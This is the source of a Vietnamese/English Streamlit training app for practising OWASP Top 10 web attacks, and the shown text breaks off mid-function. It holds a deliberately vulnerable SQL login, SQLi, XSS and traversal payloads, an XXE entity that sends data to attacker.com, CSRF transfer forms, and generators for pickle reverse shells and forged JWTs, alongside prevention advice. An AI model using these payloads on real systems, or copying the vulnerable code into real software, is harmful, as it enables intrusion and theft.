import streamlit as st
import requests
import re
import urllib.parse
import base64
import hashlib
import hmac
import sqlite3
import os
import json
import jwt
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
from plotly.subplots import make_subplots
import random
import string
from typing import Dict, List, Tuple, Optional, Any
import binascii
import subprocess

def create_lab_header(title: str, icon: str, gradient: str = "linear-gradient(90deg, #667eea 0%, #764ba2 100%)"):
    """Create compact lab header"""
    return f"""
    <div style="background: {gradient}; 
                padding: 0.8rem; border-radius: 6px; margin-bottom: 1rem;">
        <h3 style="color: white; margin: 0; font-size: 1.2rem;">{icon} {title}</h3>
    </div>
    """

def run_lab():
    """Web Security Lab - Master OWASP Top 10 Vulnerabilities"""
    
    # Compact Header
    st.markdown("""
    <div style="background: linear-gradient(135deg, #ff6b6b 0%, #4ecdc4 100%); 
                padding: 1rem; border-radius: 8px; margin-bottom: 1rem; text-align: center;">
        <h2 style="color: white; margin: 0; font-size: 1.5rem;">
            🕸️ Web Security Lab
        </h2>
        <p style="color: white; margin: 0; font-size: 0.9rem; opacity: 0.9;">
            OWASP Top 10 & Advanced Web Exploitation
        </p>
    </div>
    """, unsafe_allow_html=True)
    
    # Enhanced tabs with OWASP Top 10 coverage
    tabs = st.tabs([
        "💉 SQL Injection",
        "🔗 XSS Attacks",
        "🔐 Auth Bypass",
        "📄 Path Traversal",
        "🎆 XXE Injection",
        "🔑 CSRF Attack",
        "📦 Deserialization",
        "📝 SSTI Attack",
        "🔒 JWT Attacks",
        "🛡️ Security Headers",
        "🎯 API Security",
        "📊 Vuln Scanner"
    ])
    
    with tabs[0]:
        sql_injection_lab()
    
    with tabs[1]:
        xss_lab()
    
    with tabs[2]:
        auth_bypass_lab()
        
    with tabs[3]:
        directory_traversal_lab()
        
    with tabs[4]:
        xxe_injection_lab()
        
    with tabs[5]:
        csrf_attack_lab()
        
    with tabs[6]:
        deserialization_lab()
        
    with tabs[7]:
        ssti_attack_lab()
        
    with tabs[8]:
        jwt_attacks_lab()
        
    with tabs[9]:
        security_headers_lab()
        
    with tabs[10]:
        api_security_lab()
        
    with tabs[11]:
        vulnerability_scanner_lab()

def sql_injection_lab():
    """Lab SQL Injection"""
    st.subheader("💉 SQL Injection Lab")
    
    # Thêm phần giải thích chi tiết
    with st.expander("📖 Lý thuyết chi tiết về SQL Injection"):
        st.markdown("""
        ### 🎯 SQL Injection là gì?
        
        **SQL Injection (SQLi)** là lỗ hổng bảo mật cho phép attacker can thiệp vào các query
        mà application gửi đến database. Đây là một trong **OWASP Top 10** vulnerabilities.
        
        ### 🔍 Cách hoạt động
        
        **Vulnerable Code Example:**
        ```python
        # VULNERABLE - Never do this!
        username = request.form['username']
        password = request.form['password']
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        cursor.execute(query)
        ```
        
        **Attack Example:**
        ```
        Username: admin' --
        Password: anything
        
        Resulting Query:
        SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
        ```
        
        ### 🔥 Các loại SQL Injection
        
        **1. Union-based SQL Injection**
        - Sử dụng UNION operator để kết hợp kết quả từ multiple queries
        - **Payload example**: `' UNION SELECT username, password FROM users --`
        - **Requirement**: Cần biết số columns và data types
        - **Impact**: Có thể extract toàn bộ database
        
        **2. Boolean-based Blind SQL Injection**
        - Dựa vào phản hồi True/False của application
        - **Payload example**: `' AND 1=1 --` (True) vs `' AND 1=2 --` (False)
        - **Technique**: Từng bit một để extract data
        - **Time**: Chậm nhưng hiệu quả
        
        **3. Time-based Blind SQL Injection**
        - Sử dụng database delay functions
        - **Payload example**: `'; WAITFOR DELAY '00:00:05' --`
        - **MySQL**: `' AND SLEEP(5) --`
        - **PostgreSQL**: `'; SELECT pg_sleep(5) --`
        
        **4. Error-based SQL Injection**
        - Dựa vào error messages từ database
        - **Payload example**: `' AND (SELECT COUNT(*) FROM information_schema.tables) --`
        - **Requirement**: Application hiển thị database errors
        - **Risk**: Information disclosure through errors
        
        **5. Second-order SQL Injection**
        - Input được store và execute sau đó
        - **Example**: User registration → Profile update
        - **Difficulty**: Harder to detect và exploit
        
        ### 🎯 Common Injection Points
        
        **1. Login Forms**
        - Username/password fields
        - "Remember me" functionality
        - Password reset forms
        
        **2. Search Functions**
        - Search queries
        - Filters và sorting
        - Pagination parameters
        
        **3. URL Parameters**
        - GET parameters: `?id=1`
        - REST API endpoints
        - Hidden form fields
        
        **4. HTTP Headers**
        - User-Agent strings
        - Referer headers
        - Custom headers
        
        **5. Cookies**
        - Session cookies
        - Preference cookies
        - Tracking cookies
        
        ### 🛡️ Prevention Techniques
        
        **1. Prepared Statements (Parameterized Queries)**
        ```python
        # SECURE
        query = "SELECT * FROM users WHERE username=? AND password=?"
        cursor.execute(query, (username, password))
        ```
        
        **2. Stored Procedures**
        ```sql
        CREATE PROCEDURE GetUser(@Username NVARCHAR(50), @Password NVARCHAR(50))
        AS
        BEGIN
            SELECT * FROM users WHERE username=@Username AND password=@Password
        END
        ```
        
        **3. Input Validation**
        ```python
        import re
        
        def validate_username(username):
            # Only allow alphanumeric and underscore
            if re.match("^[a-zA-Z0-9_]+$", username):
                return True
            return False
        ```
        
        **4. Escaping Special Characters**
        ```python
        import mysql.connector
        
        def escape_string(input_str):
            return mysql.connector.converter.MySQLConverter().escape(input_str)
        ```
        
        **5. Least Privilege Principle**
        - Database user chỉ có permissions cần thiết
        - Không sử dụng admin accounts cho applications
        - Separate databases cho different functions
        
        ### 🔍 Detection Methods
        
        **Manual Testing:**
        - Single quote (`'`) injection
        - Comment sequences (`--`, `/**/`)
        - Boolean conditions (`AND 1=1`)
        - Time delays (`SLEEP()`, `WAITFOR`)
        
        **Automated Tools:**
        - **SQLMap**: Automated SQL injection tool
        - **Burp Suite**: Web application security scanner
        - **OWASP ZAP**: Free security testing proxy
        
        ### ⚠️ Impact của SQL Injection
        
        **Data Breach:**
        - Steal sensitive customer data
        - Credit card information
        - Personal identifiable information (PII)
        
        **Data Manipulation:**
        - Modify database records
        - Delete critical data
        - Insert malicious data
        
        **Authentication Bypass:**
        - Login without valid credentials
        - Privilege escalation
        - Admin account takeover
        
        **System Compromise:**
        - Execute operating system commands
        - File system access
        - Network pivoting
        """)
    
    st.markdown("""
    ### 🚀 Thực hành SQL Injection
    
    Sử dụng vulnerable login form bên dưới để thực hành các kỹ thuật SQL injection:
    """)
    
    # Tạo database mẫu nếu chưa có
    setup_sample_database()
    
    col1, col2 = st.columns([1, 1])
    
    with col1:
        st.markdown("#### 🎯 Vulnerable Login Form")
        st.markdown("*Thử các payload SQL injection khác nhau:*")
        
        username = st.text_input("Username:", value="admin")
        password = st.text_input("Password:", type="password", value="password")
        
        st.markdown("**💡 Gợi ý payload:**")
        st.code("admin' --")
        st.code("admin' OR '1'='1' --")
        st.code("' UNION SELECT username, password FROM users --")
        
        if st.button("🔓 Login"):
            result = vulnerable_login(username, password)
            
            if result['success']:
                st.success("✅ Login thành công!")
                if result['data']:
                    st.markdown("**📊 Dữ liệu trả về:**")
                    for row in result['data']:
                        st.write(f"User: {row[0]}, Pass: {row[1]}")
            else:
                st.error("❌ Login thất bại!")
                
            st.markdown("**🔍 SQL Query được thực thi:**")
            st.code(result['query'])
    
    with col2:
        st.markdown("#### 🛡️ Secure Implementation")
        
        st.markdown("**Cách phòng chống SQL Injection:**")
        
        st.markdown("1. **Prepared Statements:**")
        st.code("""
# Vulnerable
query = f"SELECT * FROM users WHERE username='{username}'"

# Secure  
query = "SELECT * FROM users WHERE username=?"
cursor.execute(query, (username,))
        """)
        
        st.markdown("2. **Input Validation:**")
        st.code("""
import re

def validate_input(input_str):
    # Chỉ cho phép alphanumeric
    if re.match("^[a-zA-Z0-9]+$", input_str):
        return True
    return False
        """)
        
        st.markdown("3. **Escape Special Characters:**")
        st.code("""
import sqlite3

def escape_input(input_str):
    return sqlite3.escape_string(input_str)
        """)

def xss_lab():
    """Lab Cross-Site Scripting"""
    st.subheader("🔗 XSS (Cross-Site Scripting) Lab")
    
    st.markdown("""
    ### 📖 Lý thuyết:
    XSS cho phép attacker inject malicious script vào web page,
    có thể steal cookies, session tokens, hoặc thực hiện actions thay user.
    
    **Các loại XSS:**
    - **Reflected XSS**: Script được reflect ngay lập tức
    - **Stored XSS**: Script được lưu trong database
    - **DOM-based XSS**: Script thực thi ở client-side
    """)
    
    col1, col2 = st.columns([1, 1])
    
    with col1:
        st.markdown("#### 🎯 Vulnerable Comment Form")
        
        comment = st.text_area("Comment:", value="Hello World!")
        
        st.markdown("**💡 Gợi ý XSS payload:**")
        st.code("<script>alert('XSS')</script>")
        st.code("<img src=x onerror=alert('XSS')>")
        st.code("<svg onload=alert('XSS')>")
        
        if st.button("💬 Submit Comment"):
            # Mô phỏng vulnerable comment processing
            processed_comment = process_comment_vulnerable(comment)
            
            st.markdown("**📝 Comment đã được lưu:**")
            # Hiển thị comment (không thực thi script thật)
            if "<script>" in comment.lower() or "onerror=" in comment.lower() or "onload=" in comment.lower():
                st.warning("⚠️ XSS payload detected! Trong thực tế, script này sẽ được thực thi.")
                st.code(processed_comment)
            else:
                st.write(processed_comment)
    
    with col2:
        st.markdown("#### 🛡️ XSS Prevention")
        
        st.markdown("**Cách phòng chống XSS:**")
        
        st.markdown("1. **HTML Encoding:**")
        st.code("""
import html

def safe_output(user_input):
    return html.escape(user_input)

# < becomes &lt;
# > becomes &gt;
# & becomes &amp;
        """)
        
        st.markdown("2. **Content Security Policy (CSP):**")
        st.code("""
Content-Security-Policy: default-src 'self'; 
script-src 'self' 'unsafe-inline';
        """)
        
        st.markdown("3. **Input Validation:**")
        st.code("""
import re

def sanitize_input(user_input):
    # Remove script tags
    cleaned = re.sub(r'<script.*?</script>', '', user_input, flags=re.IGNORECASE)
    # Remove event handlers
    cleaned = re.sub(r'on\w+\s*=', '', cleaned, flags=re.IGNORECASE)
    return cleaned
        """)

def auth_bypass_lab():
    """Lab Authentication Bypass"""
    st.subheader("🔐 Authentication Bypass Lab")
    
    st.markdown("""
    ### 📖 Lý thuyết:
    Authentication Bypass là các kỹ thuật để vượt qua cơ chế xác thực
    mà không cần credentials hợp lệ.
    """)
    
    col1, col2 = st.columns([1, 1])
    
    with col1:
        st.markdown("#### 🎯 Weak Authentication")
        
        auth_method = st.selectbox("Authentication Method:", [
            "Cookie-based Auth",
            "JWT Token Auth", 
            "Session-based Auth"
        ])
        
        if auth_method == "Cookie-based Auth":
            cookie_value = st.text_input("Cookie Value:", value="user=guest")
            
            st.markdown("**💡 Bypass techniques:**")
            st.code("user=admin")
            st.code("user=administrator")
            st.code("role=admin")
            
            if st.button("🔓 Test Cookie"):
                result = test_cookie_auth(cookie_value)
                display_auth_result(result)
        
        elif auth_method == "JWT Token Auth":
            jwt_token = st.text_area("JWT Token:", value="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature")
            
            if st.button("🔍 Analyze JWT"):
                result = analyze_jwt(jwt_token)
                st.json(result)
    
    with col2:
        st.markdown("#### 🛡️ Secure Authentication")
        
        st.markdown("**Best Practices:**")
        st.markdown("""
        1. **Strong Session Management**
        2. **Secure Cookie Attributes**
        3. **JWT Best Practices**
        4. **Multi-Factor Authentication**
        5. **Account Lockout Policies**
        """)

def directory_traversal_lab():
    """Lab Directory Traversal"""
    st.subheader("📄 Directory Traversal Lab")
    
    st.markdown("""
    ### 📖 Lý thuyết:
    Directory Traversal (Path Traversal) cho phép attacker truy cập
    các file ngoài web root directory bằng cách manipulate file paths.
    """)
    
    col1, col2 = st.columns([1, 1])
    
    with col1:
        st.markdown("#### 🎯 File Download Function")
        
        filename = st.text_input("Filename:", value="document.txt")
        
        st.markdown("**💡 Traversal payloads:**")
        st.code("../../../etc/passwd")
        st.code("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts")
        st.code("....//....//....//etc/passwd")
        
        if st.button("📥 Download File"):
            result = simulate_file_download(filename)
            
            if result['success']:
                st.success(f"✅ File found: {result['path']}")
                if result['content']:
                    st.text_area("File Content:", result['content'], height=200)
            else:
                st.error(f"❌ {result['error']}")
    
    with col2:
        st.markdown("#### 🛡️ Path Traversal Prevention")
        
        st.markdown("**Secure Implementation:**")
        st.code("""
import os
import os.path

def secure_file_access(filename):
    # Whitelist allowed files
    allowed_files = ['document.txt', 'readme.md']
    
    if filename not in allowed_files:
        raise ValueError("File not allowed")
    
    # Resolve absolute path
    base_dir = "/var/www/uploads"
    file_path = os.path.join(base_dir, filename)
    file_path = os.path.abspath(file_path)
    
    # Check if path is within base directory
    if not file_path.startswith(base_dir):
        raise ValueError("Path traversal detected")
    
    return file_path
        """)

def security_headers_lab():
    """Lab Security Headers"""
    st.subheader("🛡️ Security Headers Lab")
    
    st.markdown("""
    ### 📖 Lý thuyết:
    Security Headers giúp bảo vệ web application khỏi các attack vectors
    bằng cách cung cấp thêm layer bảo mật ở browser level.
    """)
    
    url = st.text_input("Website URL:", value="https://example.com")
    
    if st.button("🔍 Check Security Headers"):
        with st.spinner("Đang kiểm tra security headers..."):
            headers_result = check_security_headers(url)
            display_headers_result(headers_result)

# Helper Functions
def setup_sample_database():
    """Tạo database mẫu cho SQL injection lab"""
    db_path = "/tmp/sample_users.db"
    
    if not os.path.exists(db_path):
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            role TEXT
        )
        """)
        
        # Thêm dữ liệu mẫu
        users = [
            (1, 'admin', 'admin123', 'administrator'),
            (2, 'user1', 'password1', 'user'),
            (3, 'guest', 'guest123', 'guest')
        ]
        
        cursor.executemany("INSERT INTO users VALUES (?, ?, ?, ?)", users)
        conn.commit()
        conn.close()

def vulnerable_login(username, password):
    """Mô phỏng vulnerable login function"""
    db_path = "/tmp/sample_users.db"
    
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        # Vulnerable query - string concatenation
        query = f"SELECT username, password FROM users WHERE username='{username}' AND password='{password}'"
        
        cursor.execute(query)
        results = cursor.fetchall()
        
        conn.close()
        
        return {
            'success': len(results) > 0,
            'data': results,
            'query': query
        }
    except Exception as e:
        return {
            'success': False,
            'data': None,
            'query': query,
            'error': str(e)
        }

def process_comment_vulnerable(comment):
    """Mô phỏng vulnerable comment processing"""
    # Không sanitize input - vulnerable to XSS
    return comment

def test_cookie_auth(cookie_value):
    """Test cookie-based authentication bypass"""
    if "admin" in cookie_value.lower():
        return {'success': True, 'role': 'admin', 'message': 'Admin access granted!'}
    elif "user" in cookie_value.lower():
        return {'success': True, 'role': 'user', 'message': 'User access granted!'}
    else:
        return {'success': False, 'message': 'Access denied!'}

def analyze_jwt(token):
    """Phân tích JWT token"""
    try:
        # Split JWT token
        parts = token.split('.')
        
        if len(parts) != 3:
            return {'error': 'Invalid JWT format'}
        
        # Decode header and payload (không verify signature)
        header = base64.b64decode(parts[0] + '==').decode('utf-8')
        payload = base64.b64decode(parts[1] + '==').decode('utf-8')
        
        import json
        return {
            'header': json.loads(header),
            'payload': json.loads(payload),
            'signature': parts[2]
        }
    except Exception as e:
        return {'error': str(e)}

def simulate_file_download(filename):
    """Mô phỏng file download với directory traversal"""
    
    # Mô phỏng file system
    fake_files = {
        'document.txt': 'This is a sample document.',
        '../../../etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts': '127.0.0.1 localhost\n::1 localhost'
    }
    
    if filename in fake_files:
        return {
            'success': True,
            'path': filename,
            'content': fake_files[filename]
        }
    else:
        return {
            'success': False,
            'error': 'File not found'
        }

def check_security_headers(url):
    """Kiểm tra security headers của website"""
    try:
        # Mô phỏng response headers
        sample_headers = {
            'X-Frame-Options': 'DENY',
            'X-Content-Type-Options': 'nosniff',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'Content-Security-Policy': "default-src 'self'",
            'Referrer-Policy': 'strict-origin-when-cross-origin'
        }
        
        return {
            'url': url,
            'headers': sample_headers,
            'timestamp': datetime.now().isoformat()
        }
    except Exception as e:
        return {'error': str(e)}

def display_auth_result(result):
    """Hiển thị kết quả authentication test"""
    if result['success']:
        st.success(f"✅ {result['message']}")
        if 'role' in result:
            st.info(f"🔑 Role: {result['role']}")
    else:
        st.error(f"❌ {result['message']}")

def display_headers_result(result):
    """Hiển thị kết quả kiểm tra security headers"""
    if 'error' in result:
        st.error(f"❌ Error: {result['error']}")
        return
    
    st.success(f"✅ Headers checked for: {result['url']}")
    
    # Danh sách security headers quan trọng
    important_headers = [
        'X-Frame-Options',
        'X-Content-Type-Options', 
        'X-XSS-Protection',
        'Strict-Transport-Security',
        'Content-Security-Policy',
        'Referrer-Policy'
    ]
    
    st.markdown("#### 📊 Security Headers Status")
    
    for header in important_headers:
        if header in result['headers']:
            st.success(f"✅ {header}: {result['headers'][header]}")
        else:
            st.error(f"❌ {header}: Missing")
    
    # Hiển thị tất cả headers
    with st.expander("🔍 All Headers"):
        for header, value in result['headers'].items():
            st.write(f"**{header}:** {value}")

# New OWASP Top 10 Lab Functions
def xxe_injection_lab():
    """Lab XXE (XML External Entity) Injection"""
    
    st.markdown(create_lab_header("XXE Injection Lab", "🎆", "linear-gradient(90deg, #ff6a00 0%, #ee0979 100%)"), unsafe_allow_html=True)
    
    # XXE Theory
    with st.expander("📚 **XXE Attack Theory & Techniques**", expanded=False):
        st.markdown("""
        ### 🎯 **What is XXE?**
        
        XXE (XML External Entity) injection occurs when XML input containing a reference 
        to an external entity is processed by a weakly configured XML parser.
        
        ### 💣 **Attack Vectors**
        
        **1. File Disclosure:**
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE data [
          <!ENTITY file SYSTEM "file:///etc/passwd">
        ]>
        <data>&file;</data>
        ```
        
        **2. SSRF (Server-Side Request Forgery):**
        ```xml
        <!DOCTYPE data [
          <!ENTITY ssrf SYSTEM "http://internal-server/admin">
        ]>
        <data>&ssrf;</data>
        ```
        
        **3. Denial of Service (Billion Laughs):**
        ```xml
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <lolz>&lol3;</lolz>
        ```
        
        **4. Out-of-Band (OOB) XXE:**
        ```xml
        <!DOCTYPE data [
          <!ENTITY % file SYSTEM "file:///etc/passwd">
          <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
          %eval;
          %exfil;
        ]>
        ```
        """)
    
    # XXE Lab Interface
    col1, col2 = st.columns(2)
    
    with col1:
        st.markdown("#### 🎯 **XXE Attack Configuration**")
        
        attack_type = st.selectbox("Attack Type:", [
            "File Disclosure (/etc/passwd)",
            "SSRF Attack",
            "Billion Laughs DoS",
            "OOB Data Exfiltration",
            "XXE via File Upload"
        ])
        
        xml_input = st.text_area("XML Payload:", height=200, value="""<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
  <password>test</password>
</user>""")
        
        if st.button("🚀 **Execute XXE Attack**", type="primary"):
            results = simulate_xxe_attack(xml_input, attack_type)
            st.session_state['xxe_results'] = results
    
    with col2:
        st.markdown("#### 📊 **Attack Results**")
        
        if 'xxe_results' in st.session_state:
            results = st.session_state['xxe_results']
            
            if results['success']:
                st.success("✅ XXE Attack Successful!")
                
                st.markdown("**📄 Extracted Data:**")
                st.code(results['extracted_data'], language="text")
                
                st.markdown("**🔍 Attack Details:**")
                st.json(results['details'])
            else:
                st.error(f"❌ Attack Failed: {results['error']}")
            
            # Prevention tips
            with st.expander("🛡️ **XXE Prevention**"):
                st.markdown("""
                **Best Practices:**
                - 🚫 Disable DTDs (External Entities) completely
                - 🔒 Use less complex data formats (JSON)
                - 🛡️ Patch/update XML processors
                - ✅ Validate and sanitize XML input
                - 📋 Use XML parser security features
                
                **Code Example (Python):**
                ```python
                # Secure XML parsing
                import defusedxml.ElementTree as ET
                
                # This will prevent XXE attacks
                tree = ET.parse('file.xml')
                ```
                """)

def csrf_attack_lab():
    """Lab CSRF (Cross-Site Request Forgery) Attack"""
    
    st.markdown(create_lab_header("CSRF Attack Lab", "🔑", "linear-gradient(90deg, #4facfe 0%, #00f2fe 100%)"), unsafe_allow_html=True)
    
    # CSRF Theory
    with st.expander("📚 **CSRF Attack Theory**"):
        st.markdown("""
        ### 🎯 **CSRF Attack Flow**
        
        ```
        1. Victim logs into bank.com
        2. Victim visits attacker.com
        3. Attacker.com sends request to bank.com
        4. Browser includes cookies automatically
        5. Bank processes request as legitimate
        ```
        
        ### 💣 **Attack Examples**
        
        **GET-based CSRF:**
        ```html
        <img src="https://bank.com/transfer?to=attacker&amount=1000">
        ```
        
        **POST-based CSRF:**
        ```html
        <form action="https://bank.com/transfer" method="POST">
          <input type="hidden" name="to" value="attacker">
          <input type="hidden" name="amount" value="1000">
        </form>
        <script>document.forms[0].submit();</script>
        ```
        """)
    
    # CSRF Lab Interface
    col1, col2 = st.columns(2)
    
    with col1:
        st.markdown("#### ⚙️ **CSRF Attack Builder**")
        
        target_url = st.text_input("🎯 Target URL:", value="https://bank.example.com/transfer")
        
        method = st.radio("HTTP Method:", ["GET", "POST"])
        
        st.markdown("**📝 Parameters:**")
        param1_name = st.text_input("Param 1 Name:", value="to")
        param1_value = st.text_input("Param 1 Value:", value="attacker_account")
        
        param2_name = st.text_input("Param 2 Name:", value="amount")
        param2_value = st.text_input("Param 2 Value:", value="10000")
        
        if st.button("🎭 **Generate CSRF Payload**"):
            payload = generate_csrf_payload(target_url, method, 
                                           {param1_name: param1_value, 
                                            param2_name: param2_value})
            st.session_state['csrf_payload'] = payload
    
    with col2:
        st.markdown("#### 💣 **CSRF Payload**")
        
        if 'csrf_payload' in st.session_state:
            payload = st.session_state['csrf_payload']
            
            st.markdown("**🔗 Malicious HTML:**")
            st.code(payload['html'], language="html")
            
            st.markdown("**📧 Email Payload:**")
            st.code(payload['email'], language="html")
            
            st.markdown("**🌐 JavaScript Payload:**")
            st.code(payload['javascript'], language="javascript")
            
            # CSRF Token Bypass Techniques
            with st.expander("🔓 **CSRF Token Bypass**"):
                st.markdown("""
                **Bypass Techniques:**
                - 🔄 Token prediction (weak randomness)
                - 🔀 Token reuse across sessions
                - ❌ Remove token parameter
                - 🔁 Use victim's token via XSS
                - 📋 Token leakage in referrer
                """)

def deserialization_lab():
    """Lab Insecure Deserialization"""
    
    st.markdown(create_lab_header("Insecure Deserialization Lab", "📦", "linear-gradient(90deg, #f093fb 0%, #f5576c 100%)"), unsafe_allow_html=True)
    
    tabs = st.tabs(["🐍 Python Pickle", "☕ Java Serialization", "🟨 Node.js", "💎 Ruby Marshal"])
    
    with tabs[0]:
        st.markdown("#### 🐍 **Python Pickle Exploitation**")
        
        col1, col2 = st.columns(2)
        
        with col1:
            st.markdown("**💣 Pickle Bomb Generator:**")
            
            exploit_type = st.selectbox("Exploit Type:", [
                "Command Execution",
                "File Read",
                "Reverse Shell",
                "Data Corruption"
            ])
            
            if exploit_type == "Command Execution":
                command = st.text_input("Command:", value="whoami")
            elif exploit_type == "File Read":
                filepath = st.text_input("File Path:", value="/etc/passwd")
            elif exploit_type == "Reverse Shell":
                ip = st.text_input("Attacker IP:", value="10.10.10.10")
                port = st.text_input("Port:", value="4444")
            
            if st.button("🎯 Generate Pickle Payload"):
                payload = generate_pickle_payload(exploit_type)
                st.session_state['pickle_payload'] = payload
        
        with col2:
            if 'pickle_payload' in st.session_state:
                payload = st.session_state['pickle_payload']
                
                st.markdown("**📦 Serialized Payload:**")
                st.code(payload['base64'], language="text")
                
                st.markdown("**🐍 Python Code:**")
                st.code(payload['python'], language="python")
                
                st.warning("⚠️ **Warning:** Never unpickle untrusted data!")

def ssti_attack_lab():
    """Lab SSTI (Server-Side Template Injection)"""
    
    st.markdown(create_lab_header("SSTI Attack Lab", "📝", "linear-gradient(90deg, #00C9FF 0%, #92FE9D 100%)"), unsafe_allow_html=True)
    
    # SSTI Theory
    with st.expander("📚 **SSTI Attack Vectors**"):
        st.markdown("""
        ### 🎯 **Template Engines**
        
        | Engine | Detection | RCE Payload |
        |--------|-----------|-------------|
        | **Jinja2** | {{7*7}} = 49 | {{config.items()}} |
        | **Twig** | {{7*'7'}} = 49 | {{_self.env.registerUndefinedFilterCallback("exec")}} |
        | **Freemarker** | ${7*7} = 49 | ${"freemarker.template.utility.Execute"?new()("id")} |
        | **Velocity** | #set($x=7*7)$x = 49 | #set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")) |
        """)
    
    # SSTI Testing Interface
    st.markdown("#### 🔍 **SSTI Detection & Exploitation**")
    
    col1, col2 = st.columns(2)
    
    with col1:
        template_engine = st.selectbox("Template Engine:", [
            "Jinja2 (Python)",
            "Twig (PHP)",
            "Freemarker (Java)",
            "Velocity (Java)",
            "Smarty (PHP)",
            "ERB (Ruby)"
        ])
        
        test_payload = st.text_area("Test Payload:", value="{{7*7}}")
        
        if st.button("🎯 Test for SSTI"):
            results = test_ssti(template_engine, test_payload)
            st.session_state['ssti_results'] = results
    
    with col2:
        if 'ssti_results' in st.session_state:
            results = st.session_state['ssti_results']
            
            if results['vulnerable']:
                st.success("✅ SSTI Vulnerability Detected!")
                st.info(f"Output: {results['output']}")
                
                st.markdown("**🔥 RCE Payloads:**")
                for payload in results['rce_payloads']:
                    st.code(payload, language="text")
            else:
                st.error("❌ No SSTI detected")

def jwt_attacks_lab():
    """Lab JWT (JSON Web Token) Attacks"""
    
    st.markdown(create_lab_header("JWT Attacks Lab", "🔐"), unsafe_allow_html=True)
    
    # JWT Theory
    with st.expander("📚 **JWT Attack Techniques**"):
        st.markdown("""
        ### 🎯 **JWT Structure**
        ```
        header.payload.signature
        
        Header: {"alg":"HS256","typ":"JWT"}
        Payload: {"sub":"1234","name":"John","iat":1516239022}
        Signature: HMACSHA256(base64(header)+"."+base64(payload), secret)
        ```
        
        ### 💣 **Attack Vectors**
        
        | Attack | Description | Impact |
        |--------|-------------|---------|
        | **None Algorithm** | Change alg to "none" | Authentication bypass |
        | **Algorithm Confusion** | RS256 to HS256 | Use public key as secret |
        | **Weak Secret** | Brute force secret | Token forgery |
        | **Kid Injection** | SQL injection in kid | RCE possible |
        | **JKU/X5U URL** | Control key source | Key substitution |
        """)
    
    # JWT Manipulation Interface
    st.markdown("#### 🔧 **JWT Manipulation Tools**")
    
    jwt_input = st.text_area("JWT Token:", height=100, 
                              value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        if st.button("🔍 Decode JWT"):
            decoded = decode_jwt(jwt_input)
            st.json(decoded)
    
    with col2:
        if st.button("🔓 None Algorithm"):
            none_jwt = create_none_algorithm_jwt(jwt_input)
            st.code(none_jwt, language="text")
    
    with col3:
        if st.button("🔨 Crack Secret"):
            secret = crack_jwt_secret(jwt_input)
            if secret:
                st.success(f"🔑 Secret: {secret}")
            else:
                st.error("❌ Secret not found")
    
    # JWT Forgery
    st.markdown("#### 🎭 **JWT Forgery**")
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.markdown("**📝 Modify Claims:**")
        
        user_id = st.text_input("User ID:", value="admin")
        role = st.text_input("Role:", value="administrator")
        exp = st.text_input("Expiration:", value="2030-01-01")
        
        secret = st.text_input("Secret Key:", value="secret123", type="password")
        
        if st.button("🔨 Forge JWT"):
            forged_jwt = forge_jwt(user_id, role, exp, secret)
            st.session_state['forged_jwt'] = forged_jwt
    
    with col2:
        if 'forged_jwt' in st.session_state:
            st.markdown("**🎫 Forged Token:**")
            st.code(st.session_state['forged_jwt'], language="text")
            
            st.markdown("**🔍 Decoded:**")
            st.json(decode_jwt(st.session_state['forged_jwt']))

def api_security_lab():
    """Lab API Security Testing"""
    
    st.markdown(create_lab_header("API Security Lab", "🎯", "linear-gradient(90deg, #FA8BFF 0%, #2BD2FF 50%, #2BFF88 100%)"), unsafe_allow_html=True)
    
    tabs = st.tabs(["🔍 API Enumeration", "🔐 Auth Testing", "💉 Injection", "📊 Rate Limiting"])
    
    with tabs[0]:
        st.markdown("#### 🔍 **API Endpoint Discovery**")
        
        base_url = st.text_input("API Base URL:", value="https://api.example.com")
        
        wordlist = st.selectbox("Wordlist:", [
            "Common API Endpoints",
            "REST Routes",
            "GraphQL Endpoints",
            "Admin Paths",
            "Custom"
        ])
        
        if wordlist == "Custom":
            custom_paths = st.text_area("Custom Paths:", value="/api/v1/users\n/api/v1/admin\n/graphql")
        
        if st.button("🔍 Enumerate Endpoints"):
            endpoints = enumerate_api_endpoints(base_url, wordlist)
            
            st.markdown("**📋 Discovered Endpoints:**")
            for endpoint in endpoints:
                status_color = "🟢" if endpoint['status'] == 200 else "🟡" if endpoint['status'] < 500 else "🔴"
                st.write(f"{status_color} {endpoint['path']} - {endpoint['status']} - {endpoint['size']} bytes")
    
    with tabs[1]:
        st.markdown("#### 🔐 **Authentication Testing**")
        
        auth_type = st.selectbox("Auth Type:", [
            "Bearer Token",
            "API Key",
            "Basic Auth",
            "OAuth 2.0",
            "JWT"
        ])
        
        st.markdown("**🔓 Auth Bypass Techniques:**")
        
        techniques = {
